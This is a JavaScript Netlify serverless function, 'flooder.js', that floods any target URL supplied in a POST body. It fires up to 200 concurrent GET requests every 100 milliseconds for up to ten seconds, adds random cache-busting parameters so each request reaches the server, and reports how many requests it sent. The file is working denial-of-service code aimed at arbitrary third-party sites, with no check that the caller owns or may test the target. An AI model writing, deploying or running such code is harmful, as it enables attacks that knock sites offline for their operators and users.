// flooder.js - Netlify serverless function
const axios = require('axios');

exports.handler = async function(event, context) {
  try {
    if (event.httpMethod !== 'POST') {
      return { statusCode: 405, body: 'Method Not Allowed' };
    }

    const { target, concurrency, durationSec } = JSON.parse(event.body);

    if (!target || typeof target !== 'string' || concurrency <= 0 || durationSec <= 0) {
      return { statusCode: 400, body: 'Invalid parameters' };
    }

    const maxDuration = 10; // max 10 seconds flood allowed
    const floodDuration = Math.min(durationSec, maxDuration);
    const concurrencyLimit = Math.min(concurrency, 200);

    const startTime = Date.now();
    let requestsSent = 0;

    // Function to send one request
    async function sendRequest() {
      try {
        await axios.get(target + `?cachebust=${Date.now()}_${Math.random()}`, { timeout: 3000 });
        requestsSent++;
      } catch {
        // ignore errors
      }
    }

    // Flood loop: send concurrencyLimit requests every 100ms until duration reached
    while (Date.now() - startTime < floodDuration * 1000) {
      const promises = [];
      for (let i = 0; i < concurrencyLimit; i++) {
        promises.push(sendRequest());
      }
      await Promise.all(promises);
      // Wait 100ms before next burst
      await new Promise(resolve => setTimeout(resolve, 100));
    }

    return {
      statusCode: 200,
      body: JSON.stringify({ message: `Flood completed. Sent approx ${requestsSent} requests.` }),
    };

  } catch (error) {
    return { statusCode: 500, body: `Server error: ${error.message}` };
  }
};
